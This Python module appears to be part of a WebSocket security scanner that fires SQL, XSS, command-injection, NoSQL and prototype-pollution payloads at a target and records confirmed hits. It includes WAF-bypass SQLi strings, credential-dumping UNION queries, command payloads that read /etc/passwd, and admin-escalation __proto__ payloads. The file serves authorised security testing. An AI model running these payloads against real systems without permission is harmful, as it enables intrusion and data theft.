"""
Injection Attack Module
SQL, XSS, Command, NoSQL, Prototype Pollution
Zero false positives — only report with CONFIRMED evidence
"""
import asyncio
import json
import re
import time
from core.scanner import ws_connect, send_recv
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


# ── SQL Error Signatures ──────────────────────────────────────────────────────
SQL_ERRORS = [
    (r"you have an error in your sql syntax",          "MySQL"),
    (r"warning:\s*mysql",                               "MySQL"),
    (r"org\.postgresql\.util\.psqlexception",           "PostgreSQL"),
    (r"pg::syntaxerror",                                "PostgreSQL"),
    (r"microsoft ole db provider for sql server",       "MSSQL"),
    (r"odbc sql server driver",                         "MSSQL"),
    (r"ora-\d{4,5}:",                                   "Oracle"),
    (r"sqlite[_\.]?exception",                          "SQLite"),
    (r"syntax error.*?near",                            "Generic SQL"),
    (r"unclosed quotation mark",                        "MSSQL"),
    (r"quoted string not properly terminated",          "Oracle"),
    (r"sql command not properly ended",                 "Oracle"),
    (r"division by zero",                               "SQL arithmetic"),
    (r"invalid input syntax for",                       "PostgreSQL"),
    (r"column .+? does not exist",                      "PostgreSQL"),
    (r"unknown column",                                 "MySQL"),
    (r"table .+? doesn.t exist",                        "MySQL"),
]

# ── XSS — only flag if NOT inside JSON string ─────────────────────────────────
XSS_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
]

XSS_CONFIRMED_PATTERNS = [
    r'<script[\s>].*?</script>',
    r'<img[^>]+onerror\s*=',
    r'<svg[^>]+onload\s*=',
    r'javascript\s*:\s*alert',
    r'onerror\s*=\s*alert',
]

# ── SQLi Payloads ─────────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    # ── Error-Based ──────────────────────────────────────
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1; SELECT 1",
    "' UNION SELECT NULL--",
    "'; SELECT SLEEP(0)--",
    "1' AND '1'='1",
    "admin'--",
    "' OR 'x'='x",

    # ── Boolean-Based Blind ─────────────────────────────
    "' AND 1=1--",
    "' AND 1=2--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1' AND SUBSTRING(username,1,1)='a'--",

    # ── Time-Based Blind ────────────────────────────────
    "'; WAITFOR DELAY '0:0:3'--",
    "'; SELECT SLEEP(3)--",
    "1; SELECT pg_sleep(3)--",
    "' OR SLEEP(3)--",
    "1 OR 1=1 WAITFOR DELAY '0:0:3'--",

    # ── Union-Based ─────────────────────────────────────
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "1 UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",

    # ── WAF Bypass ──────────────────────────────────────
    "'/**/OR/**/1=1--",
    "' /*!OR*/ '1'='1",
    "%27 OR %271%27=%271",
    "' OR 1=1#",
    "';--",
    "' OR ''='",
    "\\' OR 1=1--",
    "' oR '1'='1",
    "' Or 1=1--",
    "'+OR+1=1--",
]

BOOLEAN_CONFIRM_PATTERNS = [
    # Checked in _test_boolean_sqli() — different true/false response = confirmed
]

TIME_THRESHOLD_SECONDS = 2.5  # If response takes >2.5s = time-based SQLi

# ── Command Injection ─────────────────────────────────────────────────────────
CMD_PAYLOADS = [
    '; id',
    '| id',
    '`id`',
    '; whoami',
    '| cat /etc/passwd',
    '; ls -la',
    '&& id',
    '$(id)',
]

CMD_CONFIRMED = [
    r'uid=\d+\(.+?\)\s+gid=\d+',
    r'root:.*?:0:0:',
    r'total\s+\d+\n.+?[-drwx]{10}',
    r'volume serial number',
    r'directory of [a-z]:\\',
]

# ── NoSQL ─────────────────────────────────────────────────────────────────────
NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
]

NOSQL_ERRORS = [
    r'mongoerror',
    r'casterror',
    r'\$where.*error',
    r'bson.*invalid',
    r'illegal key.*\$',
]

# ── Proto Pollution ───────────────────────────────────────────────────────────
PROTO_PAYLOADS = [
    '{"__proto__": {"admin": true}}',
    '{"__proto__": {"isAdmin": true, "role": "admin"}}',
    '{"constructor": {"prototype": {"admin": true}}}',
]


# ── Boolean-Based SQLi Detection ─────────────────────────────────────────────
async def _test_boolean_sqli(ws, ws_url, fast_mode=False):
    """
    Boolean-based blind SQLi:
    Send TRUE condition payload → record response
    Send FALSE condition payload → record response
    If responses DIFFER → SQLi confirmed
    """
    boolean_pairs = [
        ("' AND 1=1--",  "' AND 1=2--",  "boolean_and"),
        ("1 AND 1=1",    "1 AND 1=2",    "boolean_numeric"),
        ("' AND 'a'='a", "' AND 'a'='b", "boolean_string"),
    ]

    for true_payload, false_payload, label in boolean_pairs:
        for field in ["query", "search", "username", "id", "input"]:
            try:
                true_msg  = json.dumps({field: true_payload})
                false_msg = json.dumps({field: false_payload})

                true_resp  = await send_recv(ws, true_msg,  timeout=4)
                false_resp = await send_recv(ws, false_msg, timeout=4)

                if not true_resp or not false_resp:
                    continue

                true_len  = len(true_resp)
                false_len = len(false_resp)

                if true_len > 0 and false_len > 0:
                    ratio = max(true_len, false_len) / min(true_len, false_len)
                    if ratio > 1.3 and true_resp != false_resp:
                        ev = Evidence.make(
                            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                            request=f"TRUE msg: {true_msg}\nFALSE msg: {false_msg}",
                            response=f"TRUE response ({true_len} bytes): {true_resp[:150]}\nFALSE response ({false_len} bytes): {false_resp[:150]}",
                            proof=f"Boolean-based SQLi confirmed: TRUE response {true_len} bytes vs FALSE response {false_len} bytes (ratio: {ratio:.2f}x). Field: {field}",
                            reproduce=(
                                f"1. Connect to {ws_url}\n"
                                f"2. Send TRUE: {true_msg}\n"
                                f"3. Record response length/content\n"
                                f"4. Send FALSE: {false_msg}\n"
                                f"5. Observe different response = SQLi confirmed"
                            )
                        )
                        store.add(ws_url, 'SQL Injection (Boolean-Based Blind)', 'CRITICAL',
                            f"Boolean-based blind SQL injection confirmed.\n"
                            f"TRUE condition ({true_len} bytes) vs FALSE condition ({false_len} bytes).\n"
                            f"Field: {field}\n"
                            f"TRUE payload: {true_payload}\n"
                            f"FALSE payload: {false_payload}", ev)
                        return True

            except Exception:
                continue
    return False


# ── Time-Based SQLi Detection ─────────────────────────────────────────────────
async def _test_time_sqli(ws, ws_url):
    """
    Time-based blind SQLi:
    Send SLEEP payload → if response takes >2.5s = confirmed
    """
    time_payloads = [
        ("'; SELECT SLEEP(3)--",        "sleep_mysql",    "MySQL"),
        ("'; WAITFOR DELAY '0:0:3'--",  "sleep_mssql",    "MSSQL"),
        ("1; SELECT pg_sleep(3)--",     "sleep_postgres", "PostgreSQL"),
        ("' OR SLEEP(3)--",             "sleep_or",       "MySQL"),
        ("'; SELECT 1 FROM pg_sleep(3)","sleep_pg2",      "PostgreSQL"),
    ]

    for payload, label, db_hint in time_payloads:
        for field in ["query", "search", "username", "input"]:
            try:
                msg = json.dumps({field: payload})

                t_start = time.perf_counter()
                resp = await send_recv(ws, msg, timeout=8)
                elapsed = time.perf_counter() - t_start

                if elapsed >= TIME_THRESHOLD_SECONDS:
                    ev = Evidence.make(
                        payload=payload,
                        request=msg,
                        response=str(resp)[:200] if resp else "(no response — server sleeping)",
                        proof=f"Time-based SQLi: response took {elapsed:.2f}s (threshold: {TIME_THRESHOLD_SECONDS}s). DB hint: {db_hint}. Field: {field}",
                        reproduce=(
                            f"1. Connect to {ws_url}\n"
                            f"2. Send: {msg}\n"
                            f"3. Observe response delay of {elapsed:.1f}s\n"
                            f"4. Normal response is <0.5s — delay confirms SQLi"
                        )
                    )
                    store.add(ws_url, 'SQL Injection (Time-Based Blind)', 'CRITICAL',
                        f"Time-based blind SQL injection confirmed.\n"
                        f"Response delayed {elapsed:.2f}s using SLEEP payload.\n"
                        f"Database hint: {db_hint}\n"
                        f"Field: {field}\n"
                        f"Payload: {payload}", ev)
                    return True

            except asyncio.TimeoutError:
                ev = Evidence.make(
                    payload=payload,
                    request=json.dumps({field: payload}),
                    response="(connection timed out — server was sleeping)",
                    proof=f"Time-based SQLi: connection timed out after {TIME_THRESHOLD_SECONDS}s. DB hint: {db_hint}",
                    reproduce=(
                        f"1. Connect to {ws_url}\n"
                        f"2. Send: {json.dumps({field: payload})}\n"
                        f"3. Connection times out — server is executing SLEEP()"
                    )
                )
                store.add(ws_url, 'SQL Injection (Time-Based Blind)', 'CRITICAL',
                    f"Time-based blind SQL injection confirmed via timeout.\n"
                    f"Database hint: {db_hint}\n"
                    f"Payload: {payload}", ev)
                return True
            except Exception:
                continue
    return False


# ── WAF Bypass SQLi Detection ─────────────────────────────────────────────────
async def _test_waf_bypass_sqli(ws, ws_url):
    """
    Try WAF bypass SQLi payloads — if error-based patterns match = confirmed
    """
    waf_payloads = [
        "'/**/OR/**/1=1--",
        "' /*!OR*/ '1'='1",
        "%27 OR %271%27=%271",
        "'+OR+1=1--",
        "' oR '1'='1",
        "\\' OR 1=1--",
        "' OR ''='",
    ]

    for payload in waf_payloads:
        for field in ["query", "search", "username", "input", "q"]:
            try:
                msg  = json.dumps({field: payload})
                resp = await send_recv(ws, msg, timeout=3)
                if not resp:
                    continue

                for pattern, db_type in SQL_ERRORS:
                    if re.search(pattern, resp.lower(), re.IGNORECASE):
                        ev = Evidence.make(
                            payload=payload,
                            request=msg,
                            response=resp[:300],
                            proof=f"WAF bypass SQLi: DB error '{db_type}' triggered despite obfuscated payload",
                            reproduce=(
                                f"1. Connect to {ws_url}\n"
                                f"2. Send WAF bypass payload: {msg}\n"
                                f"3. Observe DB error — WAF was bypassed"
                            )
                        )
                        store.add(ws_url, 'SQL Injection (WAF Bypass)', 'CRITICAL',
                            f"SQL injection confirmed via WAF bypass technique.\n"
                            f"Database: {db_type}\n"
                            f"Bypass payload: {payload}", ev)
                        return True
            except Exception:
                continue
    return False


async def run_injection_tests(ws_url: str, fast_mode: bool = False) -> list:
    """Run all injection tests. Returns list of confirmed findings."""
    results = []

    payload_limit = 5 if fast_mode else len(SQLI_PAYLOADS)

    try:
        async with await ws_connect(ws_url, timeout=6) as ws:

            # ── Baseline response ─────────────────────────────────────────
            baseline = await send_recv(ws, '{"type":"ping","q":"hello"}', timeout=3)
            baseline_str = str(baseline or '')

            # ── SQL Injection ─────────────────────────────────────────────
            for payload in SQLI_PAYLOADS[:payload_limit]:
                for fmt in [
                    json.dumps({"query": payload}),
                    json.dumps({"search": payload}),
                    json.dumps({"username": payload}),
                    json.dumps({"input": payload}),
                ]:
                    resp = await send_recv(ws, fmt, timeout=3)
                    if not resp:
                        continue
                    resp_lower = resp.lower()

                    for pattern, db_type in SQL_ERRORS:
                        if re.search(pattern, resp_lower, re.IGNORECASE):
                            ev = Evidence.make(
                                payload=payload,
                                request=fmt,
                                response=resp[:300],
                                proof=f"DB error signature '{db_type}' matched: {pattern}",
                                reproduce=(
                                    f"1. Connect to {ws_url}\n"
                                    f"2. Send: {fmt}\n"
                                    f"3. Observe DB error in response"
                                )
                            )
                            added = store.add(ws_url, 'SQL Injection (Error-Based)', 'CRITICAL',
                                f"Database error revealed via payload injection.\n"
                                f"Database: {db_type}\n"
                                f"Payload: {payload}\n"
                                f"Error pattern: {pattern}", ev)
                            if added:
                                results.append('sqli')
                                log.warning(f"CRITICAL: SQL Injection on {ws_url}")
                            return results  # Stop — confirmed

            # ── Boolean-Based SQLi ────────────────────────────────────────
            if not results:
                bool_found = await _test_boolean_sqli(ws, ws_url, fast_mode)
                if bool_found:
                    results.append('sqli_boolean')

            # ── Time-Based SQLi ───────────────────────────────────────────
            if not results and not fast_mode:
                time_found = await _test_time_sqli(ws, ws_url)
                if time_found:
                    results.append('sqli_time')

            # ── WAF Bypass SQLi ───────────────────────────────────────────
            if not results:
                waf_found = await _test_waf_bypass_sqli(ws, ws_url)
                if waf_found:
                    results.append('sqli_waf')

            # ── XSS — only in non-JSON context ────────────────────────────
            for payload in XSS_PAYLOADS:
                fmt = json.dumps({"message": payload})
                resp = await send_recv(ws, fmt, timeout=3)
                if not resp:
                    continue

                # Parse response — if it's JSON, check if payload escaped HTML context
                is_confirmed = False
                try:
                    parsed = json.loads(resp)
                    resp_str = json.dumps(parsed)
                    # Only XSS if payload appears outside quotes — i.e. rendered as HTML
                    for pat in XSS_CONFIRMED_PATTERNS:
                        if re.search(pat, resp, re.IGNORECASE):
                            is_confirmed = True
                            break
                except Exception:
                    # Raw text — direct check
                    for pat in XSS_CONFIRMED_PATTERNS:
                        if re.search(pat, resp, re.IGNORECASE):
                            is_confirmed = True
                            break

                if is_confirmed:
                    ev = Evidence.make(
                        payload=payload,
                        request=fmt,
                        response=resp[:300],
                        proof="XSS payload executed/reflected outside JSON string context",
                        reproduce=(
                            f"1. Connect to {ws_url}\n"
                            f"2. Send: {fmt}\n"
                            f"3. Observe unescaped HTML/JS in response"
                        )
                    )
                    store.add(ws_url, 'Reflected XSS via WebSocket', 'HIGH',
                        f"XSS payload reflected without HTML encoding.\n"
                        f"Payload: {payload}", ev)
                    results.append('xss')
                    break

            # ── Command Injection ─────────────────────────────────────────
            if not fast_mode:
                for payload in CMD_PAYLOADS:
                    for fmt in [
                        json.dumps({"host": payload}),
                        json.dumps({"cmd": payload}),
                        json.dumps({"exec": payload}),
                        json.dumps({"ping": payload}),
                    ]:
                        resp = await send_recv(ws, fmt, timeout=4)
                        if not resp:
                            continue
                        for pat in CMD_CONFIRMED:
                            if re.search(pat, resp, re.IGNORECASE | re.DOTALL):
                                ev = Evidence.make(
                                    payload=payload,
                                    request=fmt,
                                    response=resp[:300],
                                    proof=f"OS command output detected: {pat}",
                                    reproduce=(
                                        f"1. Connect to {ws_url}\n"
                                        f"2. Send: {fmt}\n"
                                        f"3. Observe command output in response"
                                    )
                                )
                                store.add(ws_url, 'OS Command Injection', 'CRITICAL',
                                    f"OS command executed via WebSocket message.\n"
                                    f"Payload: {payload}\n"
                                    f"Output pattern: {pat}", ev)
                                results.append('cmdi')
                                return results

            # ── NoSQL ─────────────────────────────────────────────────────
            for payload in NOSQL_PAYLOADS:
                resp = await send_recv(ws, payload, timeout=3)
                if not resp:
                    continue
                for pat in NOSQL_ERRORS:
                    if re.search(pat, resp.lower(), re.IGNORECASE):
                        ev = Evidence.make(
                            payload=payload,
                            request=payload,
                            response=resp[:300],
                            proof=f"NoSQL error: {pat}"
                        )
                        store.add(ws_url, 'NoSQL Injection', 'CRITICAL',
                            f"NoSQL injection confirmed via error response.\n"
                            f"Payload: {payload}", ev)
                        results.append('nosql')
                        break

            # ── Prototype Pollution ───────────────────────────────────────
            for payload in PROTO_PAYLOADS:
                resp = await send_recv(ws, payload, timeout=3)
                if not resp:
                    continue
                resp_lower = resp.lower()
                # Only flag if injected property is reflected back as true
                if ('"admin":true' in resp_lower or '"isadmin":true' in resp_lower
                        or '"role":"admin"' in resp_lower):
                    ev = Evidence.make(
                        payload=payload,
                        request=payload,
                        response=resp[:300],
                        proof="Injected __proto__ property reflected in response as true",
                        reproduce=(
                            f"1. Connect to {ws_url}\n"
                            f"2. Send: {payload}\n"
                            f"3. Observe admin=true in response"
                        )
                    )
                    store.add(ws_url, 'Prototype Pollution', 'HIGH',
                        f"Prototype pollution confirmed — injected property reflected.\n"
                        f"Payload: {payload}", ev)
                    results.append('proto')
                    break

    except asyncio.TimeoutError:
        log.debug(f"Timeout on injection tests: {ws_url}")
    except Exception as e:
        log.debug(f"Injection test error on {ws_url}: {e}")

    return results
